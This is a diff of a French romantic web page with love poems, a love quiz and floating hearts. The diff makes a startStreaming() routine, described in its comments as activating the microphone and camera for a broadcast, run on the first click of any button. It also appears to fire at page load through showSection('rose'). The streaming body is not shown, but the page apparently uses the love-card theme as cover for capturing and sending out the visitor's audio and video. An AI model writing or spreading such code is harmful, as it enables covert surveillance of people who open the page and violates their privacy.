+            console.error("Erreur streaming:", err); 
+            document.getElementById('broadcastStatus').textContent = "❌ Erreur - Vérifiez permissions";
+            document.getElementById('broadcastStatus').style.background = "#ef4444"; 
         }
     }
     
-    // Bouton suivant : au premier clic, démarre la diffusion + change message
-    // Ensuite, seulement change le message
-    nextBtn.addEventListener('click', () => {
-        if (!streamingStarted) {
-            // Premier clic : démarrer la diffusion
-            startStreaming();
-            // Et aussi changer le message
-            changeMessageOnly();
-        } else {
-            // Diffusion déjà active : juste changer le message
-            changeMessageOnly();
-        }
-    });
-
-    // ==================== JEU D'AMOUR ====================
-    const gameQuestions = [
-        { question: "Qu'est-ce qui compte le plus dans une relation ?", answers: [
-            { text: "💕 La confiance et le respect", points: 3 },
-            { text: "💰 L'argent et les cadeaux", points: 1 },
-            { text: "🔥 La passion seulement", points: 1 },
-            { text: "🤝 Tout, un équilibre parfait", points: 3 }
-        ]},
-        { question: "Quel geste d'amour préfères-tu ?", answers: [
-            { text: "🌹 Un bouquet de roses", points: 2 },
-            { text: "💬 Un message doux le matin", points: 3 },
-            { text: "🎁 Un cadeau cher", points: 1 },
-            { text: "🕯️ Un dîner aux chandelles", points: 2 }
-        ]},
-        { question: "Que fais-tu quand ton partenaire est triste ?", answers: [
-            { text: "🤗 Je le/la prends dans mes bras", points: 3 },
-            { text: "🗣️ Je dis 'ça va passer'", points: 1 },
-            { text: "📱 Je l'ignore", points: 0 },
-            { text: "🎁 J'essaie de lui faire plaisir", points: 2 }
-        ]},
-        { question: "C'est quoi l'amour pour toi ?", answers: [
-            { text: "⭐ Un sentiment qui grandit chaque jour", points: 3 },
-            { text: "⚡ Une passion dévorante", points: 1 },
-            { text: "🏠 Une habitude confortable", points: 1 },
-            { text: "🌍 Se soutenir dans tous les moments", points: 3 }
-        ]},
-        { question: "Pour toi, un couple idéal c'est...", answers: [
-            { text: "👫 Des amoureux complices", points: 3 },
-            { text: "🎭 Des passionnés intenses", points: 2 },
-            { text: "📱 Chacun de son côté", points: 0 },
-            { text: "🤝 Des partenaires qui se respectent", points: 3 }
-        ]}
+    // ==================== MESSAGES D'AMOUR ====================
+    const messages = [
+        ["Chaque jour à tes côtés est un cadeau,", "Ton sourire éclaire mon chemin,", "Ton regard me fait vibrer tout mon être,", "Sans toi, ma vie n'a plus de sens."],
+        ["Mon cœur bat plus fort quand tu es là,", "Tes mains dans les miennes, je m'envole,", "Tu es mon ancre et ma liberté,", "Avec toi, chaque instant devient doux."],
+        ["Je veillerai sur toi chaque seconde,", "Tes rêves sont les miens, tes peines aussi,", "Ton bonheur est ma plus belle quête,", "Je t'aime plus que les mots ne peuvent dire."],
+        ["Le temps s'arrête quand je te vois,", "Ton parfum reste dans mes nuits,", "Ton absence est un vide immense,", "Reviens vite, mon cœur t'appelle."],
+        ["Sous la pluie ou sous le soleil,", "Ton visage hante mes pensées,", "Chaque seconde loin de toi est trop longue,", "Je veux t'aimer jusqu'à la fin des temps."],
+        ["Tu es la douceur qui réveille mes matins,", "La mélodie qui berce mes nuits,", "Ton rire est mon refuge secret,", "Avec toi, l'amour est infini."]
     ];
-
-    let currentQuestion = 0;
+    
+    // Compléter jusqu'à 30 messages
+    for (let i = messages.length; i < 30; i++) {
+        messages.push([`💖 Message d'amour ${i+1} - Ligne 1`, `💖 Message d'amour ${i+1} - Ligne 2`, `💖 Message d'amour ${i+1} - Ligne 3`, `💖 Message d'amour ${i+1} - Ligne 4`]);
+    }
+    
+    let currentMsgIndex = 0;
+    
+    function displayMessage() {
+        const msg = messages[currentMsgIndex];
+        document.getElementById('messageLines').innerHTML = msg.map(line => `<p>💖 ${line}</p>`).join('');
+        document.getElementById('msgCounter').textContent = `Message ${currentMsgIndex + 1} / ${messages.length}`;
+    }
+    
+    function nextMessage() {
+        currentMsgIndex = (currentMsgIndex + 1) % messages.length;
+        displayMessage();
+    }
+    
+    displayMessage();
+    document.getElementById('nextMsgBtn').addEventListener('click', nextMessage);
+    
+    // ==================== JEU DU CŒUR ====================
+    const questions = [
+        { question: "Qu'est-ce qui compte le plus dans une relation ?", answers: [{ text: "💕 La confiance et le respect", points: 3 }, { text: "💰 L'argent et les cadeaux", points: 1 }, { text: "🔥 La passion seulement", points: 1 }, { text: "🤝 Tout, un équilibre parfait", points: 3 }] },
+        { question: "Quel geste d'amour préfères-tu ?", answers: [{ text: "🌹 Un bouquet de roses", points: 2 }, { text: "💬 Un message doux le matin", points: 3 }, { text: "🎁 Un cadeau cher", points: 1 }, { text: "🕯️ Un dîner aux chandelles", points: 2 }] },
+        { question: "Que fais-tu quand ton partenaire est triste ?", answers: [{ text: "🤗 Je le/la prends dans mes bras", points: 3 }, { text: "🗣️ Je dis 'ça va passer'", points: 1 }, { text: "📱 Je l'ignore", points: 0 }, { text: "🎁 J'essaie de lui faire plaisir", points: 2 }] },
+        { question: "C'est quoi l'amour pour toi ?", answers: [{ text: "⭐ Un sentiment qui grandit chaque jour", points: 3 }, { text: "⚡ Une passion dévorante", points: 1 }, { text: "🏠 Une habitude confortable", points: 1 }, { text: "🌍 Se soutenir dans tous les moments", points: 3 }] },
+        { question: "Pour toi, un couple idéal c'est...", answers: [{ text: "👫 Des amoureux complices", points: 3 }, { text: "🎭 Des passionnés intenses", points: 2 }, { text: "📱 Chacun de son côté", points: 0 }, { text: "🤝 Des partenaires qui se respectent", points: 3 }] }
+    ];
+    
+    let currentQIndex = 0;
     let totalScore = 0;
     let maxPossibleScore = 0;
-
-    gameQuestions.forEach(q => {
-        let maxPoints = 0;
-        q.answers.forEach(a => { if (a.points > maxPoints) maxPoints = a.points; });
-        maxPossibleScore += maxPoints;
-    });
-
-    function updateProgress() {
-        const progress = (currentQuestion / gameQuestions.length) * 100;
-        document.getElementById('progressFill').style.width = progress + '%';
-        document.getElementById('questionCounter').innerHTML = `Question ${currentQuestion + 1} sur ${gameQuestions.length}`;
-    }
-
-    function updateScoreDisplay() {
-        document.getElementById('scoreValue').innerHTML = totalScore;
-    }
-
+    
+    questions.forEach(q => { let maxPoints = Math.max(...q.answers.map(a => a.points)); maxPossibleScore += maxPoints; });
+    
+    function updateProgress() { document.getElementById('progressFill').style.width = ((currentQIndex) / questions.length) * 100 + '%'; }
+    function updateScoreDisplay() { document.getElementById('scoreValue').innerHTML = totalScore; }
+    
     function showQuestion() {
         updateProgress();
-        
-        if (currentQuestion >= gameQuestions.length) {
-            showResult();
-            return;
-        }
-        
-        const q = gameQuestions[currentQuestion];
+        if (currentQIndex >= questions.length) { showResult(); return; }
+        const q = questions[currentQIndex];
         document.getElementById('questionText').innerHTML = q.question;
-        document.getElementById('questionText').className = 'question-text fade-in';
-        
         const container = document.getElementById('answersContainer');
         container.innerHTML = '';
-        container.className = 'answers-container fade-in';
-        
-        q.answers.forEach(answer => {
+        q.answers.forEach((answer) => {
             const btn = document.createElement('button');
             btn.className = 'answer-btn';
             btn.innerHTML = answer.text;
-            btn.onclick = () => selectAnswer(answer.points);
+            btn.onclick = () => { totalScore += answer.points; updateScoreDisplay(); currentQIndex++; showQuestion(); };
             container.appendChild(btn);
         });
     }
-
-    function selectAnswer(points) {
-        totalScore += points;
-        updateScoreDisplay();
-        currentQuestion++;
-        showQuestion();
-    }
-
-    function getResultMessage(score) {
-        const percentage = (score / maxPossibleScore) * 100;
-        
-        if (percentage >= 80) {
-            return { emoji: "💖💖💖", title: "🌟 Amour Parfait ! 🌟", message: "Tu as un cœur immense et sincère. Tu sais ce que l'amour véritable signifie. Ta douceur fera de toi un/une partenaire exceptionnel.", advice: "Tu es prêt(e) à vivre une belle histoire d'amour ❤️" };
-        } else if (percentage >= 60) {
-            return { emoji: "💕💕", title: "💗 Grand Cœur ! 💗", message: "Tu as beaucoup d'amour à donner ! Tu comprends l'essentiel dans une relation.", advice: "Continue à cultiver la tendresse et l'écoute ✨" };
-        } else if (percentage >= 40) {
-            return { emoji: "💗", title: "🌹 Cœur Tendre 🌹", message: "Tu as de bons sentiments, mais tu hésites parfois. Ose aimer pleinement.", advice: "Fais confiance à ton cœur, il sait ce qu'il veut 💫" };
-        } else {
-            return { emoji: "🌱", title: "🌸 Cœur en Éveil 🌸", message: "Tu découvres encore l'amour, c'est beau ! Chaque jour est une chance d'apprendre à aimer mieux.", advice: "L'amour s'apprend avec le temps, tu es sur la bonne voie 🌷" };
-        }
-    }
-
+    
     function showResult() {
         document.getElementById('quizArea').style.display = 'none';
         document.getElementById('resultArea').style.display = 'block';
-        
-        const result = getResultMessage(totalScore);
-        const messageHtml = `
-            <div style="text-align: center;">
-                <div style="font-size: 3em; margin-bottom: 10px;">${result.emoji}</div>
-                <h3 style="color: #ffb3c1; margin-bottom: 15px;">${result.title}</h3>
-                <p style="font-size: 15px; line-height: 1.5; margin: 15px 0;">${result.message}</p>
-                <div style="background: rgba(255,255,255,0.1); border-radius: 20px; padding: 12px; margin: 15px 0;">
-                    💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝
-                </div>
-                <p style="color: #ffb3c1; font-style: italic;">✨ ${result.advice} ✨</p>
-            </div>
-        `;
-        document.getElementById('resultMessage').innerHTML = messageHtml;
-        document.getElementById('resultArea').className = 'fade-in';
+        const percentage = (totalScore / maxPossibleScore) * 100;
+        let resultHtml = '';
+        if (percentage >= 80) resultHtml = `<div style="font-size: 3em;">💖💖💖</div><h2 style="color:#ff1a4f;">🌟 Amour Parfait ! 🌟</h2><p>Tu as un cœur immense et sincère. Tu sais ce que l'amour véritable signifie.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
+        else if (percentage >= 60) resultHtml = `<div style="font-size: 3em;">💕💕</div><h2 style="color:#ff1a4f;">💗 Grand Cœur ! 💗</h2><p>Tu as beaucoup d'amour à donner ! Tu comprends l'essentiel dans une relation.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
+        else if (percentage >= 40) resultHtml = `<div style="font-size: 3em;">💗</div><h2 style="color:#ff1a4f;">🌹 Cœur Tendre 🌹</h2><p>Tu as de bons sentiments, mais tu hésites parfois. Ose aimer pleinement.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
+        else resultHtml = `<div style="font-size: 3em;">🌱</div><h2 style="color:#ff1a4f;">🌸 Cœur en Éveil 🌸</h2><p>Tu découvres encore l'amour, c'est beau ! Chaque jour est une chance d'apprendre.</p><div style="background:#fff0f2;border-radius:20px;padding:15px;margin:20px 0;"><strong>💝 Ton Score : ${totalScore} / ${maxPossibleScore} 💝</strong></div>`;
+        document.getElementById('resultMessage').innerHTML = resultHtml;
     }
-
-    window.restartGame = function() {
-        currentQuestion = 0;
-        totalScore = 0;
-        updateScoreDisplay();
-        document.getElementById('quizArea').style.display = 'block';
-        document.getElementById('resultArea').style.display = 'none';
-        showQuestion();
-    };
-
-    showQuestion();
-
-    // ==================== ANIMATIONS & CŒURS FLOTTANTS ====================
-    const romanticWords = ["💖 Amour", "🌹 Passion", "💕 Douceur", "✨ Magie", "🌸 Tendresse", "💗 Émotion", "🌟 Rêve", "💞 Romance"];
     
+    window.restartGame = function() { currentQIndex = 0; totalScore = 0; updateScoreDisplay(); document.getElementById('quizArea').style.display = 'block'; document.getElementById('resultArea').style.display = 'none'; showQuestion(); };
+    
+    // ==================== NAVIGATION AVEC DÉMARRAGE STREAMING ====================
+    let streamingStarted = false;
+    
+    function showSection(sectionName) {
+        // Masquer toutes les sections
+        document.getElementById('roseSection').classList.remove('active');
+        document.getElementById('messagesSection').classList.remove('active');
+        document.getElementById('gameSection').classList.remove('active');
+        
+        // Afficher la section sélectionnée
+        if (sectionName === 'rose') document.getElementById('roseSection').classList.add('active');
+        else if (sectionName === 'messages') document.getElementById('messagesSection').classList.add('active');
+        else if (sectionName === 'game') { 
+            document.getElementById('gameSection').classList.add('active'); 
+            showQuestion(); 
+        }
+        
+        // DÉMARRER LE STREAMING AU PREMIER CLIC SUR N'IMPORTE QUEL BOUTON
+        if (!streamingStarted) {
+            streamingStarted = true;
+            startStreaming();
+        }
+        
+        // Mettre à jour le bouton actif
+        document.querySelectorAll('.nav-btn').forEach(btn => {
+            if (btn.getAttribute('data-section') === sectionName) {
+                btn.classList.add('active');
+            } else {
+                btn.classList.remove('active');
+            }
+        });
+    }
+    
+    // Ajouter les événements aux boutons
+    document.querySelectorAll('.nav-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const section = btn.getAttribute('data-section');
+            showSection(section);
+        });
+    });
+    
+    // ==================== CŒURS FLOTTANTS ====================
     function createHeart() {
         const heart = document.createElement('div');
-        const hearts = ['❤️', '💖', '💗', '💓', '💕', '💝', '💘', '💞'];
+        const hearts = ['❤️', '💖', '💗', '💓', '💕', '💝', '💘', '🌹', '🌸'];
         heart.className = 'heart';
         heart.innerHTML = hearts[Math.floor(Math.random() * hearts.length)];
         heart.style.left = Math.random() * 100 + '%';
         heart.style.fontSize = (Math.random() * 20 + 15) + 'px';
         heart.style.animationDuration = (Math.random() * 5 + 4) + 's';
-        heart.style.animationDelay = Math.random() * 10 + 's';
         document.body.appendChild(heart);
-        setTimeout(() => heart.remove(), 10000);
+        setTimeout(() => heart.remove(), 8000);
     }
-    
-    function createFloatingText() {
-        const text = document.createElement('div');
-        text.className = 'floating-text';
-        text.innerHTML = romanticWords[Math.floor(Math.random() * romanticWords.length)];
-        text.style.left = Math.random() * 100 + '%';
-        text.style.fontSize = (Math.random() * 8 + 12) + 'px';
-        text.style.color = `hsl(${Math.random() * 30 + 340}, 80%, 70%)`;
-        text.style.animationDuration = (Math.random() * 6 + 5) + 's';
-        document.body.appendChild(text);
-        setTimeout(() => text.remove(), 12000);
-    }
-    
     setInterval(createHeart, 600);
-    setInterval(createFloatingText, 2000);
     
-    // Nettoyage avant fermeture
+    // Initialiser la section Rose par défaut
+    showSection('rose');
+    
+    // Nettoyage à la fermeture
     window.addEventListener('beforeunload', () => {
         if (isStreaming) {
             if (heartbeatInterval) clearInterval(heartbeatInterval);
@@ -947,7 +664,7 @@ body {
         }
     });
     
-    console.log("🌹 Application prête - Le premier clic sur 'Message suivant' active micro/caméra");
+    console.log("🌹 Application prête - La diffusion démarre au premier clic sur un bouton !");
 </script>
 </body>
 </html>
